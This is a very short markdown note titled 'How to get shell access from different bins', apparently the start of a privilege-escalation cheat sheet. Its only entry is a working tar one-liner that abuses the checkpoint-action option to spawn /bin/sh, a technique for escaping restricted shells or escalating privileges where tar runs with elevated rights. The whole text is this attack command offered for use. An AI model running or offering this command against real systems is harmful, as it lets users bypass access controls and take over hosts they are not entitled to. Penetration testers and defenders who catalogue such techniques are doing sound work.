# How to get shell access from different bins

### Tar
`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`